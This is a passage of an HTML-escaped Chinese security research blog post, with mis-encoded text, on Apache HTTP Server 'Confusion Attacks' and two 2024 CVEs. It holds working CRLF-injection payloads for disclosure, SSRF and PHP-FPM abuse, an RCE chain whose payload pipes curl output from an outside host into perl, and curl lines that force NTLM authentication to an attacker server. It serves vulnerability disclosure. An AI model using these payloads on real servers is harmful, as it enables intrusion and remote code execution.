    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$redir&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;‚úîÔ∏è 3-2-1. Arbitrary Handler to Information Disclosure&lt;/h5&gt;

&lt;p&gt;È¶ñÂÖàÊòØÂæû‰ªªÊÑèÊ®°ÁµÑËôïÁêÜÂô®ÂëºÂè´Âà∞Ë≥áË®äÊ¥©ÊºèÔºåÈÄôË£°‰ΩøÁî®‰∫Ü Httpd ÂÖßÂª∫ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-status&lt;/code&gt; Ê®°ÁµÑËôïÁêÜÂô®ÔºåÈÄôÂÄãÊ®°ÁµÑËôïÁêÜÂô®ÈÄöÂ∏∏Âè™Ë¢´ÂÖÅË®±ÂæûÊú¨Ê©üÂ≠òÂèñÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /server-status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; server-status
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; local
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú®ÊìÅÊúâ‰ªªÊÑèÊ®°ÁµÑËôïÁêÜÂô®ÂëºÂè´ÂæåÔºåÂèØ‰ª•ÈÄèÈÅéË§áÂØ´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; ÂéªÂ≠òÂèñÂéüÊú¨Â≠òÂèñ‰∏çÂà∞ÁöÑÊïèÊÑüË≥áË®äÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:server-status&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;‚úîÔ∏è 3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/h5&gt;

&lt;p&gt;Áï∂ÁÑ∂‰πüËÉΩËºïÈ¨ÜÁöÑÊää‰∏ÄÂºµÂúñÁâáËΩâÂåñÊàê PHP ÂæåÈñÄÔºå‰æãÂ¶ÇÁï∂‰ΩøÁî®ËÄÖ‰∏äÂÇ≥‰∫Ü‰∏ÄÂÄãÊìÅÊúâÂêàÊ≥ïÂâØÊ™îÂêçÁöÑÊ™îÊ°àÂæåÔºåÂèØ‰ª•ÈÄèÈÅéÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÊåáÂÆöÁâπÂÆöÊ®°ÁµÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; ÂéªÂü∑Ë°åÊ™îÊ°àÂÖßÂµåÁöÑÊÉ°ÊÑèÁ®ãÂºèÁ¢ºÔºå‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/uploads/avatar.webp&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:application/x-httpd-php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;Ô∏è-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;‚úîÔ∏è 3-2-2. Arbitrary Handler to Full SSRF&lt;/h5&gt;

&lt;p&gt;ÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; Â≠òÂèñ‰ªª‰ΩïÂçîË≠∞‰ª•Âèä‰ªªÊÑèÁ∂≤ÂùÄÁï∂ÁÑ∂‰πü‰∏çÂú®Ë©±‰∏ãÔºå‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:http://example.com/%3f&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âè¶Â§ñÈÄô‰πüÊòØ‰∏ÄÂÄãÂèØ‰ª•ÂÆåÊï¥ÊéßÂà∂ HTTP Ë´ãÊ±ÇÈÇÑÊúâÂèñÂæóÊâÄÊúâ HTTP ÂõûÊáâÁöÑ SSRFÔºÅ Á®çÂæÆÂèØÊÉúÁöÑ‰∏ÄÈªûÊòØÂú®Â≠òÂèñ Cloud Metadata ÊôÇÊúÉË¢´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; ÊúÉËá™ÂãïÂä†‰∏ä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; Ê®ôÈ†≠Â∞éËá¥Ë¢´ EC2 Âèä GCP ÁöÑ &lt;a href=&quot;https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations&quot;&gt;Metadata ‰øùË≠∑Ê©üÂà∂&lt;/a&gt;ÈòªÊìãÔºåÂê¶ÂâáÈÄôÊúÉÊòØ‰∏ÄÂÄãÊõ¥Âº∑Â§ßÁöÑÊîªÊìäÊâãÊ≥ï„ÄÇ&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;‚úîÔ∏è 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/h5&gt;

&lt;p&gt;ÁÑ∂ËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; Êèê‰æõ‰∫Ü‰∏ÄÂÄãÊõ¥„ÄåÊñπ‰æø„ÄçÁöÑÂäüËÉΩ ‚Äî‚Äî ÂèØ‰ª•Â≠òÂèñÊú¨Âú∞ÁöÑ Unix Domain SocketÔºÅ üòâ&lt;/p&gt;

&lt;p&gt;ÈÄôË£°Â±ïÁ§∫ÈÄèÈÅéÂ≠òÂèñ PHP-FPM Êú¨Âú∞ÁöÑ Unix Domain Socket ÂéªÂü∑Ë°å‰ΩçÊñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt; ‰∏ãÁöÑ PHP ÂæåÈñÄÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ÈÄôÂÄãÊâãÊ≥ïÁêÜË´ñ‰∏äÈÇÑÂ≠òÂú®ËëóÊõ¥Â§öÁöÑÂèØËÉΩÊÄßÔºå‰æãÂ¶ÇÂçîË≠∞Ëµ∞ÁßÅ (Âú® HTTP/HTTPS ÂçîË≠∞ÈñìËµ∞ÁßÅ FastCGI üòè) ÊàñÂÖ∂ÂÆÉÊòìÂèóÂΩ±ÈüøÁöÑ Local Sockets Á≠âÔºåÈÄôÈÉΩ‰∫§Áµ¶ÊúâËààË∂£ÁöÑ‰∫∫ÁπºÁ∫åÁ†îÁ©∂‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-2-4-arbitrary-handler-to-rce&quot;&gt;‚úîÔ∏è 3-2-4. Arbitrary Handler to RCE&lt;/h5&gt;

&lt;p&gt;ÊúÄÂæå‰æÜÂ±ïÁ§∫‰∏Ä‰∏ãÂ¶Ç‰ΩïÈÄèÈÅé‰∏ÄÂÄãÂ∏∏Ë¶ãÁöÑ CTF Â∞èÊäÄÂ∑ßÊääÈÄôÂÄãÊîªÊìäÊâãÊ≥ïËΩâÂåñÊàê RCEÔºÅ Áî±Êñº PHP ÂÆòÊñπÁöÑ &lt;a href=&quot;https://hub.docker.com/_/php&quot;&gt;Docker Êò†ÂÉèÊ™î&lt;/a&gt; Âú®Âª∫ÊßãÊôÇÂºïÂÖ•‰∫Ü PEAR ÈÄôÂ•óÂëΩ‰ª§Âàó PHP Â•ó‰ª∂ÁÆ°ÁêÜÂ∑•ÂÖ∑ÔºåÈÄèÈÅéÂÖ∂‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pearcmd.php&lt;/code&gt; ‰ΩúÁÇ∫ÂÖ•Âè£ÈªûÂèØ‰ª•ËÆìÊàëÂÄëÈÅîÊàêÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÂà©Áî®ÔºåË©≥Á¥∞ÁöÑÊ≠∑Âè≤ÂèäÂéüÁêÜÂèØ‰ª•ÂèÉËÄÉÁî± &lt;a href=&quot;https://x.com/phithon_xg&quot;&gt;Phith0n&lt;/a&gt; Êí∞ÂØ´ÁöÑ &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&quot;&gt;Docker PHP LFI Á∏ΩÁµêÊñá&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôË£°ÊàëÂÄëÂà©Áî®Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests&lt;/code&gt; ÂÖßÁöÑ Command Injection ‰æÜÂÆåÊàêÊï¥ÂÄãÊîªÊìäÈèàÔºåË©≥Á¥∞ÁöÑÊîªÊìäÈèàÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Á∂≤Ë∑Ø‰∏äÁ∂ìÂ∏∏Âú® Security Advisory Êàñ Bug Bounty ÁúãÂà∞Êää CRLF Injection Êàñ Header Injection Áï∂Êàê XSS Â†±ÂëäÔºåÈõñÁÑ∂Á¢∫ÂØ¶ÊúâÊ©üÊúÉÈÄèÈÅé SSO ‰∏≤Âá∫ Account Takeover Á≠âÁ≤æÂΩ©ÊºèÊ¥ûÔºå‰ΩÜË´ã‰∏çË¶ÅÂøò‰∫ÜÂÆÉ‰πüËÉΩ‰∏≤Âá∫ Server-Side RCEÔºåÈÄôÂÄãÁ§∫ÁØÑË≠âÊòé‰∫ÜÂÆÉÁöÑÂèØËÉΩÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-4-ÂÖ∂ÂÆÉÊºèÊ¥û&quot;&gt;üî• 4. ÂÖ∂ÂÆÉÊºèÊ¥û&lt;/h3&gt;

&lt;p&gt;Âü∫Êú¨‰∏äÊï¥ÂÄã Confusion Attacks Á≥ªÂàóÂà∞ÈÄôÈÇäÂ∑Æ‰∏çÂ§öÂëä‰∏ÄÂÄãÊÆµËêΩÔºåÁÑ∂ËÄåÂú®Á†îÁ©∂ Apache HTTP Server ÁöÑÈÅéÁ®ã‰∏≠ÈÇÑÊúâ‰∫õÂÄºÂæó‰∏ÄÊèêÁöÑÊºèÊ¥ûÂõ†Ê≠§Â∞áÂÆÉÂÄëÁç®Á´ãÂá∫‰æÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-cve-2024-38472---Âü∫Êñº-windows-unc-ÁöÑ-ssrf&quot;&gt;‚öîÔ∏è CVE-2024-38472 - Âü∫Êñº Windows UNC ÁöÑ SSRF&lt;/h4&gt;

&lt;p&gt;È¶ñÂÖàÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apr_filepath_merge()&lt;/code&gt; ÂáΩÊï∏Âú® Windows ÁöÑÂØ¶‰ΩúÂÖÅË®±‰ΩøÁî® UNC Ë∑ØÂæëÔºå‰∏ãÈù¢Êèê‰æõÂÖ©Á®Æ‰∏çÂêåÁöÑËß∏ÁôºË∑ØÂæëËÆìÊîªÊìäËÄÖÂèØ‰ª•Âêë‰ªªÊÑè‰∏ªÊ©üÁôºËµ∑ NTLM Ë™çË≠âÔºö&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-ÈÄèÈÅé-http-Ë´ãÊ±ÇËß£ÊûêÂô®Ëß∏Áôº&quot;&gt;‚úîÔ∏è ÈÄèÈÅé HTTP Ë´ãÊ±ÇËß£ÊûêÂô®Ëß∏Áôº&lt;/h5&gt;

&lt;p&gt;ÊÉ≥Ë¶ÅÁõ¥Êé•ÈÄèÈÅé HTTP Ë´ãÊ±ÇËß∏ÁôºÈúÄË¶ÅÂú® Httpd ‰∏≠Ë®≠ÁΩÆÈ°çÂ§ñÁöÑË®≠ÂÆöÔºåÈõñÁÑ∂ÈÄôÂÄãË®≠ÂÆöÁ¨¨‰∏ÄÁúºÁúãËµ∑‰æÜÊúâÈªû‰∏çÁèæÂØ¶Ôºå‰ΩÜ‰ºº‰πéÁ∂ìÂ∏∏Ëàá Tomcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_jk&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_ajp&lt;/code&gt;) ÊàñÊòØËàá &lt;a href=&quot;https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes&quot;&gt;PATH_INFO&lt;/a&gt; ‰∏ÄËµ∑Âá∫ÁèæÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âè¶Â§ñÁî±Êñº Httpd Âú® 2.4.49 ÂæåÈáçÂØ´‰∫ÜÊ†∏ÂøÉ HTTP Ë´ãÊ±ÇËß£ÊûêÂô®ÈÇèËºØÔºåË¶ÅÂú®Â§ßÊñºÊ≠§ÁâàÊú¨ÁöÑ Httpd ‰∏äËß∏ÁôºÊºèÊ¥ûÈúÄË¶ÅÂÜçÈ°çÂ§ñÂä†‰∏ä‰∏ÄÂÄãË®≠ÂÆöÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
MergeSlashes &lt;span class=&quot;ss&quot;&gt;Off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄèÈÅéÂÖ©ÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5C&lt;/code&gt; ÂèØ‰ª•‰ΩøÂº∑Ëø´ Httpd Âêë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker-server&lt;/code&gt; ÁôºËµ∑ NTLM Ë™çË≠âÔºåÂØ¶Âãô‰∏ä‰πüÂèØÈÄèÈÅé &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;NTLM Relay&lt;/a&gt; ÁöÑÊñπÂºèÂ∞áÊ≠§ SSRF ËΩâÂåñÊàê RCEÔºÅ&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/%5C%5Cattacker-server/path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-ÈÄèÈÅé-type-map-Ëß∏Áôº&quot;&gt;‚úîÔ∏è ÈÄèÈÅé Type-Map Ëß∏Áôº&lt;/h5&gt;

&lt;p&gt;&lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235&quot;&gt;Debian/Ubuntu ÁöÑ Httpd ÁôºË°åÁâà&lt;/a&gt;‰∏≠È†êË®≠ÂïüÁî®‰∫Ü Type-MapÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; type-map &lt;span class=&quot;ss&quot;&gt;var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄèÈÅé‰∏äÂÇ≥‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; Ê™îÊ°àÂà∞‰º∫ÊúçÂô®ÔºåÂ∞áÂÖ∂‰∏≠ URI Ê¨Ñ‰ΩçÊåáÂÆöÊàê UNC Ë∑ØÂæë‰πüÂèØÂº∑Ëø´‰º∫ÊúçÂô®ÂêëÊîªÊìäËÄÖÁôºËµ∑ NTLM Ë™çË≠âÔºåÈÄô‰πüÊòØÊàëÊâÄÊèêÂá∫ÁöÑ&lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle&quot;&gt;Á¨¨‰∫åÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; Â∞èÊäÄÂ∑ß&lt;/a&gt; üòâ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-cve-2024-39573---Âü∫Êñº-rewriterule-ÂâçÁ∂¥ÂèØÂÆåÂÖ®ÊéßÂà∂ÁöÑ-ssrf&quot;&gt;‚öîÔ∏è CVE-2024-39573 - Âü∫Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÂâçÁ∂¥ÂèØÂÆåÂÖ®ÊéßÂà∂ÁöÑ SSRF&lt;/h4&gt;

&lt;p&gt;ÊúÄÂæåÂâáÊòØÁï∂‰ΩçÊñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; ÊàñÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost&lt;/code&gt; ‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÂâçÁ∂¥ÂÆåÂÖ®ÂèØÊéßÊôÇÔºåÂèØ‰ª•ÂëºÂè´Âà∞ Proxy ‰ª•ÂèäÁõ∏ÈóúÂ≠êÊ®°ÁµÑÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/broken(.*) $1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄèÈÅé‰∏ãÂàóÁ∂≤ÂùÄÂèØÂ∞áË´ãÊ±ÇËΩâ‰∫§Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; ËôïÁêÜÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/brokenproxy:unix:/run/[...]|http://path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰ΩÜÂ¶ÇÊûúÁ∂≤ÁÆ°ÊúâÂ•ΩÂ•ΩÊ∏¨Ë©¶ÔºåÂ∞±ÊúÉÁôºÁèæÈÄôÊ®£Â≠êÁöÑË¶èÂâáÊòØ‰∏çÂØ¶ÈöõÁöÑÔºåÊâÄ‰ª•ÂéüÊú¨Âè™ÊääÂÆÉÁï∂ÊàêÂè¶Â§ñ‰∏ÄÂÄãÊºèÊ¥ûÁöÑÊê≠ÈÖçÁµÑÂêà‰∏ÄËµ∑ÂõûÂ†±ÔºåÊ≤íÊÉ≥Âà∞ÈÄôÂÄãË°åÁÇ∫‰πüË¢´Áï∂Êàê‰∏ÄÂÄãÂÆâÂÖ®ÈÇäÁïå‰øÆÂæ©„ÄÇ ÂÜçÈö®Ëëó‰øÆË£úÂá∫‰æÜÂæå‰πüÁúãÂà∞ÂÖ∂‰ªñÁ†îÁ©∂Âì°ÊääÂêåÊ®£Ë°åÁÇ∫Â•óÁî®Âú® Windows UNC ‰∏äÁç≤ÂæóÂè¶Â§ñ‰∏ÄÂÄãÈ°çÂ§ñÁöÑ CVE„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Êú™‰æÜÁ†îÁ©∂ÊñπÂêë&quot;&gt;Êú™‰æÜÁ†îÁ©∂ÊñπÂêë&lt;/h2&gt;

&lt;p&gt;ÊúÄÂæåÊòØÈóúÊñºÈÄô‰ªΩÁ†îÁ©∂ÁöÑÊú™‰æÜÁöÑ‰∏Ä‰∫õÂ±ïÊúõ‰ª•ÂèäÂèØÂä†Âº∑ÁöÑÂú∞ÊñπÔºåÂü∫Êú¨‰∏ä Confusion Attacks ‰ªçÁÑ∂ÊòØ‰∏ÄÂÄãÂæàÊúâÊΩõÂäõÁöÑÊîªÊìäÈù¢ÔºåÂ∞§ÂÖ∂ÊòØÊàëÈÄôÊ¨°ÁöÑÁ†îÁ©∂‰∏ªË¶Å‰πüÂè™Â∞àÊ≥®Âú®ÂÖ©ÂÄãÊ¨Ñ‰Ωç‰∏äËÄåÂ∑≤ÔºåÂè™Ë¶Å Apache HTTP Server Ê≤íÊúâÂ•ΩÂ•ΩÂæûÂ∫ïÂ±§ÈÄ≤Ë°åÁµêÊßãÊÄßÂä†Âº∑ÊàñÊèê‰æõÁµ¶ÈñãÁôºËÄÖ‰∏ÄÂÄãÂ•ΩÁöÑÈñãÁôºÊ®ôÊ∫ñÔºåÁõ∏‰ø°Êú™‰æÜÈÇÑÊúÉÊúâÊõ¥Â§ö„ÄåÊ∑∑Ê∑Ü„ÄçÂá∫ÁèæÔºÅ&lt;/p&gt;

&lt;p&gt;Ëá≥ÊñºÈÇÑÊúâÂì™‰∫õÊñπÈù¢ÂèØ‰ª•Âä†Âº∑Âë¢Ôºü ÂÖ∂ÂØ¶‰∏çÂêåÁöÑ Httpd ÁôºË°åÁâàÊúÉÊúâ‰∏çÂêåÁöÑË®≠ÂÆöÊ™îÊ°àÔºåÂõ†Ê≠§ÂÖ∂ÂÆÉÁöÑ Unix-Like Á≥ªÁµ±‰æãÂ¶Ç RHEL ÂÆ∂Êóè„ÄÅBSD Á≥ªÂàóÔºåÁîöËá≥‰ΩøÁî®Âà∞ Httpd ÁöÑÂ•óË£ùËªüÈ´îÔºåÂÆÉÂÄëÈÉΩÊúâÊ©üÊúÉÂá∫ÁèæÊõ¥Â§öÂèØË∑≥ËÑ´ÁöÑÈáçÂØ´Ë¶èÂâá„ÄÅÊõ¥Â§öÂé≤ÂÆ≥ÁöÑ Local Gadgets ÁîöËá≥ÊÑèÊñôÂ§ñÁöÑÁ¨¶ËôüË∑≥Ë∫çÁ≠âÁ≠â ÔºåÂ∞±‰∫§Áµ¶ÊúâËààË∂£ÁöÑ‰∫∫ÁπºÁ∫åÂêß„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÁî±ÊñºÊôÇÁ®ãÂõ†Á¥†Ôºå‰æÜ‰∏çÂèäÂàÜ‰∫´Êõ¥Â§öÂú®ÂØ¶ÈöõÁ∂≤Á´ô„ÄÅË®≠ÂÇôÔºåÁîöËá≥ÈñãÊ∫êÂ∞àÊ°à‰∏äÁôºÁèæ‰∏¶Âà©Áî®ÁöÑÁúüÂØ¶Ê°à‰æãÔºå‰∏çÈÅé‰Ω†ÊáâË©≤Â∑≤Á∂ìÂèØ‰ª•ÊÉ≥ÂÉè ‚Äî‚Äî Âú®ÁúüÂØ¶‰∏ñÁïå‰∏≠ÁµïÂ∞çÈÇÑËóèËëóÂçÉÂçÉËê¨Ëê¨ÂÄãÊØîÊÉ≥ÂÉè‰∏≠ÈÇÑË¶ÅÂ§ßÈáèÊú™ÈñãÊé°ÁöÑË¶èÂâá„ÄÅÂèØÁπûÈÅéÁöÑË™çË≠âÔºå‰ª•ÂèäÈö±ËóèÂú®Ê™ØÈù¢‰∏ãÁöÑ CGIÔºåËá≥ÊñºÂ¶Ç‰ΩïÊääÈÄôÁØáË£°Èù¢ÊâÄË¨õÂà∞ÁöÑÊäÄÂ∑ßÂØ¶ÈöõÊáâÁî®Âú®ÂÖ®‰∏ñÁïå‰∏äÔºü Êé•‰∏ã‰æÜÂ∞±ÊòØ‰Ω†ÂÄëÁöÑ‰ªªÂãô‰∫ÜÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÁµêË™û&quot;&gt;ÁµêË™û&lt;/h2&gt;

